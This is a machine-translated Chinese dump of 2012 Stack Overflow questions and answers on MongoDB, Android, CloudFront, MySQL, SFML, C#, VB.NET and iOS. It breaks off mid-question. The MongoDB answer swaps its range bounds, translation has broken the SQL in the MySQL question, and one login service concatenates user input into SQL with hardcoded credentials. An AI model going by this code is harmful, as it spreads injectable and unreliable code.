所以`helpers`只是一个别名`ApplicationController.helpers`

查找来源的`app`过程类似。以下是相关来源：

```
def app(create=false)
  @app_integration_instance = nil if create
  @app_integration_instance ||= new_session do |sess|
    sess.host! "www.example.com"
  end
end 
```

所以`app`在控制台中是一个别名`@app_integration_instance`，我可以验证它在控制器中是否可用

在应用程序中使用这些是一种好习惯吗？可能不是。

这是一种快速访问 Rails 视图助手和渲染器的方法吗？我认同。

# python - 如何从 MongoDB 中的间隔获取数据？

> ID：13061273
> 
> 赞同：0
> 
> 时间：2012-10-25T03:49:23.863
> 
> 标签：python, mongodb

数据：

```
x   y   timestamp
123 123 1000165
123 123 1000167
123 123 1000160
123 123 1000168
123 123 1000154
123 123 1000132
123 123 1000112 
```

如何从时间戳间隔 [time1;time2] 获取数据？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:08:43.707

尝试

```
db.foo.find({
    $and: [
        {"timestamp" : { $lte: 1000112}},
        {"timestamp" : { $gte: 1000165}}
    ] 
}) 
```

# javascript - 向下滚动但越过底部 div 的 div

> ID：13061274
> 
> 赞同：0
> 
> 时间：2012-10-25T03:49:31.007
> 
> 标签：javascript, css, html, position

我不知道我是否正确解释了标题。抱歉英语不好。

我将侧边栏设置为 div:fixed。但是当我向下滚动时，我需要在一段时间后停止它，而不是超出其他 div。

[http://binarix.com/newsite/index.php/training/3-month-close-the-sale-program](http://binarix.com/newsite/index.php/training/3-month-close-the-sale-program)

有人能帮我吗

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T03:56:04.150

执行此操作的常用方法是使用 JavaScript 代码，当用户滚动到某个点时更改 div 的显示模式。

如果您使用的是 jQuery，[StickyScroll可能是一个有用的东西。](http://www.orangecoat.com/stickyscroll)

# java - 启动新活动时，带有 WebView 的 Android 活动崩溃

> ID：13061276
> 
> 赞同：0
> 
> 时间：2012-10-25T03:49:59.040
> 
> 标签：java, android, webview, youtube

问题更新：返回按钮的问题神秘地解决了。现在开始新活动时它会崩溃（全屏播放器）

我在四种情况下测试了我的应用程序：
1\. 在出现 WebView 之前按下按钮：它工作正常
2\. 在 WebView 中播放 YouTube 视频时按下按钮：它工作正常
3\. 在 WebView 播放完毕后按下按钮：它工作正常
**4.在出现WebView之后点击播放按钮之前按下按钮：它崩溃了**

我的代码如下：

```
@Override
public void onCreate(Bundle savedInstanceState) {
    // Remove notification bar
    this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN);
    this.getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

    super.onCreate(savedInstanceState); 
    webview = (WebView) findViewById(R.id.web_view_player_vertical);
    webview.clearCache(true);
    webview.clearHistory();
    webview.getSettings().setJavaScriptEnabled(true);
    webview.getSettings().setPluginState(PluginState.ON);
    webview.getSettings().setPluginsEnabled(true);
    webview.getSettings().setLoadWithOverviewMode(true);// completely zoomed out
    webview.getSettings().setUseWideViewPort(true);
    webview.getTouchables();
    webview.setBackgroundColor(Color.parseColor("#00000000"));
    webview.setWebChromeClient(new WebChromeClient());
    webview.setWebViewClient(new WebViewClient());
    webview.loadUrl(emdLink);
}

@Override
public void onPause() {
    super.onPause();
    try {
        Log.i("in onpause", "onpause try");
        Class.forName("android.webkit.WebView")
                .getMethod("onPause", (Class[]) null)
                .invoke(webview, (Object[]) null);
        Log.i("in onpause", "onpause tried");

    } catch (ClassNotFoundException cnfe) {
    } catch (NoSuchMethodException nsme) {
    } catch (InvocationTargetException ite) {
    } catch (IllegalAccessException iae) {
    } catch (Exception  all) {
        Log.i("Exception", "Exception : "+all );
    }

    webview.destroy();
}

public void FullScreenFunction(){
        Log.v("FullScreenFunction", "durationPass :: " + duration);
        Log.v("FullScreenFunction", SrcPath1);
        Bundle bundle = new Bundle();
        bundle.putString("duration", duration);
        bundle.putString("link", SrcPath1);
        bundle.putString("youtubeLink", youtubeLink);
        bundle.putString("thumbnailLink", thumbnailLink);
        bundle.putString("title", title);
        bundle.putString("id", VideoId);
        bundle.putString("view_count", viewCount);
        bundle.putString("uploaded_date", date);
        Log.v("FullScreenFunction", "start");

        Intent myIntent = new Intent(this, HdPlayerHorizontal.class);
        myIntent.putExtras(bundle);
        startActivity(myIntent);

}

@Override
protected void onDestroy() {
    // TODO Auto-generated method stub
    super.onDestroy();
    Toast.makeText(this, "onDestroy", Toast.LENGTH_LONG).show();
}

@Override
protected void onStop() {
    // TODO Auto-generated method stub
    super.onStop();
    Toast.makeText(this, "onStop", Toast.LENGTH_LONG).show();
}

@Override
public void onResume() {
    super.onResume();
    Log.v("onResume", "onResume");

} 
```

任何形式的帮助将不胜感激。提前致谢！

以下是来自 logcat 的消息：

```
I/ActivityManager(1872): START {HdPlayerHorizontal (has extras)} from pid 13552
I/onPuase(13552): onPuase
I/in onpause(13552): onpause try
I/in onpause(13552): onpause tried
D/webviewglue(13552): nativeDestroy view: 0xc7b8d0
A/libc(13552): Fatal signal 11 (SIGSEGV) at 0x00d84c18 (code=2) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T05:05:07.417

致命信号 11 是因为 webview 在您销毁它后仍在绘制。只需将 webView.destroy() 放在 onStop 中。我相信您的应用程序会正常运行

# cdn - Amazon CloudFront 是否通过 set-cookie 标头？

> ID：13061282
> 
> 赞同：11
> 
> 时间：2012-10-25T03:50:25.430
> 
> 标签：cdn, amazon-cloudfront

当我的 CloudFront 源包含`set-cookie`响应中的标头时：CloudFront 是否会缓存响应的标头`set-cookie header`？如果没有，是否有 CDN 可以？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2017-08-15T02:51:17.700

答案并不像“是”或“否”那么简单。是的，CloudFront 将“通过”set-cookie 标头，但不，它不会缓存 set-cookie 标头。这可以通过简单地上传一个测试页面来测试，该页面返回一个带有随机值的 set-cookie 标头并重复加载该页面。

CloudFront 将传递请求 cookie 并返回已在分配的“行为”部分中列入白名单的 cookie 的 set-cookie 标头（或所有 cookie，如果这样配置）。任何包含白名单 cookie 的 set-cookie 标头的响应都不会被缓存。

还应注意，CloudFront 将其对象 ID 中任何列入白名单的 cookie 的值用于缓存对象。一个特别重要的情况是会话 ID 或用户特定的 cookie - 用户在第一次查看页面时总是会遇到缓存未命中，因为 CloudFront 使用 URL 和 cookie 的值来识别缓存的页面。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-28T16:21:40.337

答案是肯定的，他们会。他们在配置分配以允许无/白名单/全部时有下拉菜单

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-09-14T15:02:54.527

扩展@anthony-disanti 的出色答案，可以通过执行以下步骤将要缓存的（公共）内容加载到 CloudFront 中：

*   将特定 cookie 列入白名单。这允许 cookie 返回给第一个查看器并在第一次刷新时再次发送。
*   通过使用缓存控制避免 Set-Cookie 标头包含在缓存键中来允许缓存，例如：`public, no-cache="Set-Cookie", max-age=86400`

在我们的带有一些公共网页的 asp.net 核心应用程序的案例中，当从 CloudFront 提供服务时，公共网页的响应时间从 120 毫秒下降到 20 毫秒。当从磁盘缓存服务到 1 毫秒。在这种情况下，cookie 名称是“.AspNetCore.Session”。

如果您不转发 cookie，CloudFront 将不会缓存，因为每个源响应都包含一个 set-cookie 标头。

当您无法更改源的行为时，您可能需要考虑在源响应上使用 Lambda@edge 触发器，例如：

```
'use strict';

exports.handler = (event, context, callback) => {
    const response = event.Records[0].cf.response;

    if(response.headers['cache-control'])
    {
        response.headers['cache-control'] = [{ 
            key:   'Cache-Control', 
            value: 'public, max-age=604800, no-cache="Set-Cookie"'
        }];
    }

    callback(null, response);
}; 
```

# mysql - Mysql Join 查询困境

> ID：13061288
> 
> 赞同：2
> 
> 时间：2012-10-25T03:50:51.337
> 
> 标签：mysql, subquery

我有 4 个表，我试图在一个表中提取某些数据，这个查询可能结构不太好，但我的原型至少需要一些东西。我有

```
    用户
    ------
    ID
    parent_id
    姓名
    姓

    预订
    --------
    ID
    client_id
    Division_id
    细分_id
    sub_event_id
    host_id
    客人ID

    行程
    ----------
    ID
    预订编号
    itinerary_type_id
    客户成本

    行程类型
    -------------
    航班
    酒店
    转移

```

这是我当前的查询

```

         选择

         (SELECT CONCAT(name,' ',surname) FROM users WHERE id = bookings.host_id) 作为主机，
    CONCAT(users.name,' ',users.surname) AS 名称，
    （SELECT client_cost FROM itineraries WHERE itinerary_type_id = 1 AND booking_id = bookings.id AND client_cost 不为空）作为航班，
    （SELECT client_cost FROM itineraries WHERE itinerary_type_id = 2 AND booking_id = bookings.id AND client_cost 不为空）作为酒店，
    （SELECT client_cost FROM itineraries WHERE itinerary_type_id = 3 AND booking_id = bookings.id AND client_cost 不为空）作为转移，
    （总计 1 + 总计 2 + 总计 3）AS 总计

    从

    （SELECT（SELECT client_cost FROM itineraries WHERE itinerary_type_id = 1 AND booking_id = bookings.id AND client_cost 不为空）作为total1，
    (SELECT client_cost FROM itineraries WHERE itinerary_type_id = 2 AND booking_id = bookings.id AND client_cost 不为空) 作为total2,
    （SELECT client_cost FROM itineraries WHERE itinerary_type_id = 3 AND booking_id = bookings.id AND client_cost 不为空）作为total3 FROM bookings）q，用户

    在 bookings.guest_id = users.id 上加入预订
    在 users.client_id = bookings.client_id 上加入客户
    在 details.user_id = users.id 上加入详细信息
    在 Divisions.client_id = users.client_id 上加入部门
    加入细分 ON subdivisions.division_id = bookings.division_id 加入 sub_events ON sub_events.id = bookings.sub_event_id
    在 itineraries.booking_id = bookings.id WHERE bookings.id = 1572 上加入行程
    GROUP BY bookings.id

```

预期的结果是

```
    主持人|姓名|航班|酒店|接送|总计
    --------------------------------------------------
    迈克·利特尔|鲍勃·帕克|200 |100 |30 |330

```

目前我正在使用子查询来临时创建一个表格，从中获取总数..但它似乎不起作用......我认为，问题是我无法将预订 ID 传递给新的临时子查询表....还有其他解决方法吗？我将永远伟大！：-） .. 真的 ！！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:14:19.573

这可能不是您正在寻找的确切 SQL（省略了很多与其他代码表的连接，但仅包括主要查询）并且可能存在愚蠢的语法错误，因为我没有对其进行测试。但想法是为预订选择一个摘要，然后将摘要与用户表连接起来。（查询被推广以适应多个预订 ID 选择。）

```
SELECT
    booking_summary.booking_id,
    booking_summary.host_id,
    concat(users.name, ' ', users.surname) as host, 
    concat(users.name, ' ', users.surname) as name, 
    booking_summary.flight, 
    booking_summary.hotel, 
    booking_summary.transfer, 
    (booking_summary.flight+booking_summary.hotel+booking_summary.transfer) as total
FROM
    (select booking_id, max(host_id) as host_id, sum(flight) as flight, sum(hotel) as hotel, sum(transfer) as transfer from (
        select b.host_id, i.booking_id, i.client_cost as flight, 0 as hotel, 0 as transfer from itineraries i, bookings b where i.itinerary_type_id = 1 AND i.booking_id in (1572, 1573, 1574) and i.booking_id=b.id
        union all
        select b.host_id, i.booking_id, 0 as flight, i.client_cost as hotel, 0 as transfer from itineraries i, bookings b where i.itinerary_type_id = 2 AND i.booking_id in (1572, 1573, 1574) and i.booking_id=b.id
        union all
        select b.host_id, i.booking_id, 0 as flight, 0 as hotel, i.client_cost as transfer from itineraries i, bookings b where i.itinerary_type_id = 3 AND i.booking_id in (1572, 1573, 1574) and i.booking_id=b.id
    ) temp_booking_result group by booking_id) booking_summary,
    users
WHERE
    users.id=booking_summary.host_id; 
```

# android - 在 Android 应用连接到 Web 服务后保持会话

> ID：13061295
> 
> 赞同：3
> 
> 时间：2012-10-25T03:51:35.380
> 
> 标签：android

我正在使用 ksoap2 进行 Web 服务方法调用。首先，用户必须登录。我希望 Web 服务中的其他方法只能在登录后调用。但我不能那样做。因为我在网络服务中没有任何会话。我不知道如何在网络服务中做到这一点。Web 服务如何知道用户已经登录 Android 应用程序？您有任何想法、会话或 cookie 吗 :(。感谢您阅读我的问题。这是我在网络服务中的代码

```
public class Login {
String message;
Connection conn;
String url;
ResultSet rs;
Statement stmt;
public String login(String username, String password) {
    try {
        Class.forName("org.postgresql.Driver");
        url = "jdbc:postgresql://localhost:5432/FirstDB";
        conn = DriverManager.getConnection(
                url, "postgres",
                "root");
        stmt = conn.createStatement();
        rs = stmt.executeQuery("SELECT * From account Where username = '"+ username + "'and password = '" + password +"'");
        if ( rs.next() ) {
            message = "true";
        } else {
            message = "false";
        }
    } catch (Exception e) {
        System.err.println("Got an exception! ");
        System.err.println(e.getMessage());
    }
    return message;
}

public String Test() {
    if(message.equals("true")) 
    {
        return "abc";
    }
    return "bdf";
} 
```

}

在安卓应用中。首先我调用方法 login()，然后调用方法 Test()。结果总是“bdf”。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T03:55:25.860

要在 Android 应用程序中维护会话，您可以使用共享首选项。

例如，请参阅[使用共享首选项的 Android 用户会话管理](http://www.androidhive.info/2012/08/android-session-management-using-shared-preferences/)

或者您可以尝试以这种方式[在android中维护会话（应用程序在服务器端保持身份验证）](https://stackoverflow.com/a/6054828/1265724)

# debugging - SFML 1.6 - sf::Sprite.Move() 在 main() 函数之外不起作用

> ID：13061296
> 
> 赞同：0
> 
> 时间：2012-10-25T03:51:36.533
> 
> 标签：debugging, sfml

一段时间以来，我在 SFML 1.6 中移动我的精灵时遇到了问题。虽然我的程序中的所有变量都已正确设置，但该函数`sf::Sprite.Move()`仅在函数内`main()`起作用。我在`playerMoveTest()`下面的 main.cpp 文件中的函数中复制了这个问题。如果有人知道这个错误的解决方案，或者愿意提供帮助，将不胜感激。

```
#include "main.h"
#include "collision.cpp"
#include "events.cpp"
#include "animation.cpp"
//#include "hud_pls_mnu.cpp" TODO Put Back in
#include "physics.cpp"

#define FPS 60 //Define frames per second for the program to run on

#define WIN_DEM_X 800
#define WIN_DEM_Y 600

#define MNU_OFF 0
#define MNU_MAIN 1
#define MNU_PAUSE 2
#define MNU_INV 3
int menu=MNU_OFF;

void playerMoveTest(void);

int main()
{
 //Open a window
 sf::RenderWindow App(sf::VideoMode(WIN_DEM_X, WIN_DEM_Y), "Crispy Bacon");

 bool firstframe=true;

 //Initialize the player
 if(!player_data.image.LoadFromFile("spritesheet.png"))
   return EXIT_FAILURE;
 sf::Sprite player(player_data.image);
 player.SetPosition(10, 10);
 player_data.time_in_cycle.Reset();
 player.Resize(300,300); //Resize "player" to be smaller than the window

 //Initialize an object
 if(!cursor_data.image.LoadFromFile("cursor.png"))
   return EXIT_FAILURE;
 sf::Sprite cursor(cursor_data.image);
 cursor.SetPosition(400, 300);
 cursor_data.time_in_cycle.Reset();
 cursor.Resize(50, 50);

 //NOTE Testing stuff here
 sf::Vector2f playerSize=player.GetSize();
 sf::Vector2f objectSize=cursor.GetSize();
 printf("Player size:\nX:%f\nY:%f\nObject Size:\nX:%f\nY:%f\n", playerSize.x, playerSize.y, objectSize.x, objectSize.y);

 App.SetFramerateLimit(60);//Set a FPS cap

 //Draw screen border.(Room 101)
 sf::Shape rm_101;
 rm_101.AddPoint(5, 5,                     sf::Color(255, 0, 0),     sf::Color(0, 0, 0));
 rm_101.AddPoint(5, WIN_DEM_Y-5,           sf::Color(255, 0, 0),     sf::Color(0, 0, 0));
 rm_101.AddPoint(WIN_DEM_X-5, WIN_DEM_Y-5, sf::Color(255, 0, 0),     sf::Color(0, 0, 0));
 rm_101.AddPoint(WIN_DEM_X-5, 5,           sf::Color(255, 0, 0),     sf::Color(0, 0, 0));
 rm_101.SetOutlineWidth(20);
 rm_101.EnableFill(false);

 // Define a text string for version number
 sf::String version_num("Pre-Alpha v0.0.0");
 version_num.SetPosition(10.f, 550.f);
 version_num.SetColor(sf::Color::Black);

 //Create a view
 sf::View view(sf::FloatRect(0, 0, 800, 600));

 //Start running loop
 while (App.IsOpened())
 {
  // Get elapsed time
  Frametime = App.GetFrameTime();

  //Process Events(i.e. the window was told to close)
  switch(menu)
  {
    case MNU_OFF:
      game_events(App);
      break;

    case MNU_MAIN:
      if(firstframe==true) break;

  }

  //Move stuff TODO:Make so uses linked lists(in phisics file?
  move(player, player_data);
  playerMoveTest();

  //Match proper player animation frame
  animateBody(player, player_data);

  //Clear Screen NOTEVarious screnclears for testing
  if(collide_rec(player, cursor))
    App.Clear(sf::Color(100, 100, 100));
  else
    App.Clear(sf::Color(255, 255, 255));

  //Set View to player
  view.SetCenter(player.GetPosition());

  //Display stuff
  App.SetView(view);//Set View to normal 
  App.Draw(rm_101);
  App.Draw(player);
  App.Draw(cursor);

  //After the view is set to the HUD position 
  App.SetView(App.GetDefaultView());//Set veiw to HUD position 
  App.Draw(version_num);

  App.Display();

  firstframe=false;
 }
}

void playerMoveTest(void)
{
 player.Move(50,50); 
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T16:58:54.703

`player`sprite is 仅定义在，因此`main`您无法引用 in `playerMoveTest(void)`（超出范围）。尝试将其作为参数传递。

```
int main(){
....
playerMoveTest(player);
....
}

void playerMoveTest(sf:Sprite& player)
{
 player.Move(50,50); 
} 
```

# css - Bootstrap v2.1.1 - 没有谷歌地图

> ID：13061302
> 
> 赞同：0
> 
> 时间：2012-10-25T03:52:01.573
> 
> 标签：css, twitter-bootstrap

谷歌地图没有显示在我的页面上。这似乎是与 Twitter Bootstrap 相关的问题。经过一番研究，似乎这应该可以解决问题：

```
#map_canvas label { width: auto; display:inline; }
#map_canvas img { max-width: none; max-height: none; } 
```

它对我没有任何作用。我还是没看到地图。我正在使用 Bootstrap v2.1.1。不确定我找到的解决方案是否适用于该版本的 Bootstrap。有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T09:47:25.870

我使用 Bootstrap 2.1.1 和谷歌地图。这对我有用...

```
<div id="map_canvas"></div>

<style>
#map_canvas
{
  width: 100%;
  height: 450px;
  margin: 20px 0 20px 0;
}
</style> 
```

初始化脚本...

```
function InitializeMap() {
   var myOptions = {
      zoom: 12,
      center: myLatlng,
      panControl: false,
      panControlOptions: {
         position: google.maps.ControlPosition.RIGHT_TOP
      },
      mapTypeControl: true,
      mapTypeControlOptions: {
         style: google.maps.MapTypeControlStyle.DROPDOWN_MENU,
         position: google.maps.ControlPosition.TOP_RIGHT
      },
      zoomControl: true,
      zoomControlOptions: {
         style: google.maps.ZoomControlStyle.SMALL,
         position: google.maps.ControlPosition.RIGHT_TOP
      },
      mapTypeId: google.maps.MapTypeId.ROADMAP
   }
   myMap = new google.maps.Map(document.getElementById("map_canvas"), myOptions);
   var marker = new google.maps.Marker({ position: myLatlng, map: myMap, title: "yyyZ, Ltd." });
   var contentString = "1122 N Clark Street<br />Chicago, IL 60610";
   var infowindow = new google.maps.InfoWindow({ content: contentString });
   google.maps.event.addListener(marker, 'click', function () {
      if (lastOpenInfoWin) lastOpenInfoWin.close();
      lastOpenInfoWin = infowindow;
      infowindow.open(myMap, marker);
      myMap.setCenter(myLatlng);
   });

   var trafficLayer = new google.maps.TrafficLayer();
   trafficLayer.setMap(myMap);
} 
```

[您可以在http://reactivewebdesign.net/Chicago/Traffic](http://reactivewebdesign.net/Chicago/Traffic)查看结果

从左侧菜单中，yopu 还可以选择使用谷歌地图和地理位置的“我在哪里”。

# c# - C# Sql 更新数据库

> ID：13061303
> 
> 赞同：2
> 
> 时间：2012-10-25T03:52:03.263
> 
> 标签：c#, sql, phpmyadmin

我有`issues updating my database`。我创建了一个应用程序来获取`customers name, phone, email, their computer details and the services`. 我想**更新**它们，但我遇到了一些麻烦。我将数据插入数据库的方式是这样的。

```
private void btnCreate_Click(object sender, EventArgs e)
        {
            //string connString = "server=localhost;uid=*****;password=********;database=dbomonkworksinfo;";
            MySqlConnection conn = new MySqlConnection("server=localhost;uid=******;password=********;database=dbomonkworksinfo;");
            conn.Open();

 try
            {
                MySqlCommand command = new MySqlCommand("Insert into tserviceinfo (First_Name, Last_Name, Date, Phone, Email, Tech, Brand, Model, OS, Type, PC_Issue) values (?First_Name, ?Last_Name, ?Date, ?Phone, ?Email, ?Tech, ?Brand, ?Model, ?OS, ?Type, ?PC_Issue)", conn);
                command.Parameters.AddWithValue("?First_Name", tbFirstName.Text);
                command.Parameters.AddWithValue("?Last_Name", tbLastName.Text);
                command.Parameters.AddWithValue("?Date", tbDate.Text);
                command.Parameters.AddWithValue("?Phone", tbPhone.Text);
                command.Parameters.AddWithValue("?Email", tbEmail.Text);
                command.Parameters.AddWithValue("?Tech", tbTech.Text);
                command.Parameters.AddWithValue("?Brand", tbBrand.Text);
                command.Parameters.AddWithValue("?Model", tbModel.Text);
                command.Parameters.AddWithValue("?OS", tbOS.Text);
                command.Parameters.AddWithValue("?PC_Issue", tbIssue.Text);
                command.Parameters.AddWithValue("?Services", lvOrdered.Items);

                if (rbDesktop.Checked)
                {
                    command.Parameters.AddWithValue("?Type", "Desktop");
                }
                else if (rbNotebook.Checked)
                {
                    command.Parameters.AddWithValue("?Type", "Notebook");
                }

               /** MySqlCommand command2 = new MySqlCommand("Insert into tpcinfo (Brand, Model, OS, PC_Issue, Services) values (?Brand, ?Model, ?OS, ?PC_Issue, ?Services)", conn);
                command2.Parameters.AddWithValue("?Brand", tbBrand.Text);
                command2.Parameters.AddWithValue("?Model", tbModel.Text);
                command2.Parameters.AddWithValue("?OS", tbOS.Text);
                command2.Parameters.AddWithValue("?PC_Issue", tbIssue.Text);
                command2.Parameters.AddWithValue("?Services", lvOrdered.Items);
                * Changed to only one table. No one besides me sees the behind the program. 
                * **/

                //command2.Parameters.AddWithValue("?type", SqlDbType.NVarChar).Value = type;
                command.ExecuteNonQuery();
                conn.Close();

                tbFirstName.Clear();
                tbLastName.Clear();
                tbDate.Clear();
                tbEmail.Clear();
                tbBrand.Clear();
                tbIssue.Clear();
                tbTech.Clear();
                tbModel.Clear();
                tbPhone.Clear();
                tbOS.Clear();
                lvOrdered.Items.Clear();
                lblPrice.Text = "$0.00";

            }
            catch (MySqlException ex)
            {
                MessageBox.Show("Can't connect to database\n" + ex.ToString());
            }
        } 
```

我的问题是真的，`how would I write an update statement?`我在网上看过，但我无法根据我的需要调整任何东西，我正在画一个空白。我一直在研究这个程序，但我已经停止了几个月，现在我真的画了一个空白。任何帮助将不胜感激！我能够查看输入的数据，但现在更新是下一步！谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T03:54:51.337

就这么简单，

```
UPDATE tserviceinfo 
SET    First_Name = ?First_Name, 
       Last_Name = ?Last_Name, 
       Date = ?Date, 
       Phone = ?Phone, 
       Email = ?Email, 
       Tech = ?Tech, 
       Brand = ?Brand, 
       Model = ?Model, 
       OS = ?OS, 
       Type = ?Type
// WHERE  condition here 
```

# vb.net - VB.net 解析 HTML 电视节目表

> ID：13061308
> 
> 赞同：1
> 
> 时间：2012-10-25T03:52:39.897
> 
> 标签：vb.net, parsing, html-parsing, html-agility-pack

我从电视列表页面中获取了以下 HTML 代码：

```
<div class="channel_row">
   <span class="channel">                            
    <div class="logo"><img src ="/images/channel_logos/WGNAMER.png" /></div>                            
    <p><strong>2</strong><br />
    WGNAMER
    </p>
   </span>                          

   <span class="time" style="width:0.0px;padding:0;height:42px;">
     <div style="margin:10px">
       <a class="thickbox" style="" href="/tv/info/?program_id=49909&height=260&width=612" title="WGN News at Nine">WGN News at Nine</a>                                     
       <p class="schedule_flags"><strong class="new_flag">New</strong>, <strong class="cc_flag">CC</strong>, <strong class="stereo_flag">Stereo</strong></p>
     </div>
   </span>                          
   <span class="time" style="width:245.6px;padding:0;height:42px;">
     <div style="margin:10px">
       <a class="thickbox" style="" href="/tv/info/?program_id=49910&height=260&width=612" title="America&#39;s Funniest Home Videos">America&#39;s Funniest Home Videos</a>                                     
       <p class="schedule_flags"><strong class="cc_flag">CC</strong>, <strong class="stereo_flag">Stereo</strong></p>
     </div>
   </span>                          
</div> 
```

它只是一遍又一遍地循环使用**channel_row ......**

**现在我已经在HtmlAgilityPack**的帮助下设置了一些 VB 代码，希望有一种快速简便的方法来遍历所有这些类并获取**徽标图像、电视频道、电台名称、更多节目描述和节目标题的 HREF**

所以在上面的例子中，解析看起来像：

```
/images/channel_logos/WGNAMER.png
2
WGNAMER
/tv/info/?program_id=49909&height=260&width=612
WGN News at Nine

/tv/info/?program_id=49910&height=260&width=612
America&#39;s Funniest Home Videos 
```

我的VB代码是：

```
Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
    Dim htmlString As String = "<div class=""channel_row"">" & _
                   "<span class=""channel"">" & _
                           "<div class=""logo""><img src =""/images/channel_logos/WELF.png"" /></div>" & _
                       "<p><strong>13</strong><br />" & _
  "WELF" & _
                       "</p>" & _
                   "</span>" & _
                       "<span class=""time"" style=""width:245.6px;padding:0;height:42px;"">" & _
                           "<div style=""margin:10px"">" & _
                               "<a class=""thickbox"" style="""" href=""/tv/info/?program_id=35424&height=260&width=612"" title=""Praise the Lord"">Praise the Lord</a>" & _
                               "<p class=""schedule_flags""><strong class=""cc_flag"">CC</strong></p>" & _
                           "</div>" & _
                       "</span>" & _
                       "<span class=""time"" style=""width:122.8px;padding:0;height:42px;"">" & _
                           "<div style=""margin:10px"">" & _
                               "<a class=""thickbox"" style="""" href=""/tv/info/?program_id=35425&height=260&width=612"" title=""ACLJ This Week"">ACLJ This Week</a> " & _
                               "<p class=""schedule_flags""><strong class=""cc_flag"">CC</strong></p>" & _
                           "</div>" & _
                       "</span>" & _
                       "<span class=""time"" style=""width:122.8px;padding:0;height:42px;"">" & _
                           "<div style=""margin:10px"">" & _
                               "<a class=""thickbox"" style="""" href=""/tv/info/?program_id=35426&height=260&width=612"" title=""Full Flame"">Full Flame</a>  " & _
                               "<p class=""schedule_flags""><strong class=""cc_flag"">CC</strong></p>" & _
                           "</div>" & _
                       "</span>" & _
                       "<span class=""time"" style=""width:0.0px;padding:0;height:42px;"">" & _
                           "<div style=""margin:10px"">" & _
                               "<a class=""thickbox"" style="""" href=""/tv/info/?program_id=35427&height=260&width=612"" title=""Secrets: Kim Clement"">Secrets: Kim Clement</a>                                     " & _
                               "<p class=""schedule_flags""></p>" & _
                           "</div>" & _
                       "</span>" & _
               "</div>"

    Dim doc = New HtmlAgilityPack.HtmlDocument()
    Dim htmlDocument As IHTMLDocument2 = New HTMLDocumentClass()
    htmlDocument.write(htmlString)
    htmlDocument.close()

    doc.LoadHtml(String.Format(htmlString))
    Dim res = doc.DocumentNode.SelectNodes("//div[@class='channel_row']")

    For Each item In res
        Dim firstDiv = item.SelectSingleNode(".//div[@class='channel']")
        Dim content1 = firstDiv.ChildNodes(0).InnerText.Trim()
        Dim content2 = firstDiv.ChildNodes(1).InnerText.Trim()
        Dim content4 = item.SelectSingleNode(".//div[@class='myclass2']")
    Next
End Sub 
```

目前错误在线**Dim content1 = firstDiv.ChildNodes(0).InnerText.Trim()**说：

**你调用的对象是空的。**

任何帮助都会很棒！

**更新**

使用最新的代码建议：

```
Dim doc = New HtmlAgilityPack.HtmlDocument()
doc.LoadHtml(htmlString)

Dim all = new Dictionary(of String, Object)()
For Each channel In doc.DocumentNode.SelectNodes(".//div[@class='channel_row']") 
    Dim info = new Dictionary(of String, Object)()

    With channel

        info!Logo    = .SelectSingleNode(".//img").Attributes("src").Value
        info!Channel = .SelectSingleNode(".//span[@class='channel']").ChildNodes(1).ChildNodes(0).InnerText
        info!Station = .SelectSingleNode(".//span[@class='channel']").ChildNodes(1).ChildNodes(2).InnerText

        info!Shows = From tag In .SelectNodes(".//a[@class='thickbox']")
                     Select New With {.Show = tag.Attributes("title").Value, .Link = tag.Attributes("href").Value}

    End With

    all.Add(info!Station, info)
Next 

all.Dump() 
```

有3个错误：

1) 在线**选择 New With {.Show = Tag.Attributes("title").Value, .Link = Tag.Attributes("href").Value}**

错误是：**“选择案例”必须以匹配的“结束选择”结尾。**

2) 在线**all.Add(info!Station, info)**

错误是：**语句和标签在“选择案例”和第一个“案例”之间无效。**

3) 上线**all.Dump()**

错误是：**“转储”不是“System.Collections.Generic.Dictionary(Of String, Object)”的成员。**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T09:20:07.603

我不是 HtmlAgilityPack 专家，但如何：

```
Dim htmlString As String = "<div class=""channel_row"">" &  _ ...

Dim doc = New HtmlAgilityPack.HtmlDocument()
doc.LoadHtml(htmlString)

Dim all = new Dictionary(of String, Object)()
For Each channel In doc.DocumentNode.SelectNodes(".//div[@class='channel_row']") 
    Dim info = new Dictionary(of String, Object)()

    With channel

        info!Logo    = .SelectSingleNode(".//img").Attributes("src").Value
        info!Channel = .SelectSingleNode(".//span[@class='channel']").ChildNodes(1).ChildNodes(0).InnerText
        info!Station = .SelectSingleNode(".//span[@class='channel']").ChildNodes(1).ChildNodes(2).InnerText

        info!Shows = From tag In .SelectNodes(".//a[@class='thickbox']")
                     Select New With {.Show = tag.Attributes("title").Value, .Link = tag.Attributes("href").Value}

    End With

    all.Add(info!Station, info)
Next 

all.Dump() 
```

![在此处输入图像描述](../Images/27eebe9c045b812973351920aebea858.png)

# objective-c - UITapGestureRecognizer 为 location.x 值返回 0

> ID：13061314
> 
> 赞同：1
> 
> 时间：2012-10-25T03:53:21.793
> 
> 标签：objective-c, cocoa-touch, event-handling

我正在向`UITapGestureRecognizer`我的 Board 类添加一个，它是`UIView`. 我想获取 Tap 事件的位置。这是我的自定义初始化方法：

```
- (void)setup
{
    [self setUserInteractionEnabled:YES];
    UITapGestureRecognizer *singleFingerTap = [[UITapGestureRecognizer alloc] 
        initWithTarget:self 
        action:@selector(handleSingleTap:)];
    [self addGestureRecognizer:singleFingerTap];

    ...
} 
```

这是我的 singleFingerTap 方法：

```
- (void)handleSingleTap:(UITapGestureRecognizer *)recognizer 
{
    CGPoint location = [recognizer locationInView:[recognizer.view superview]];
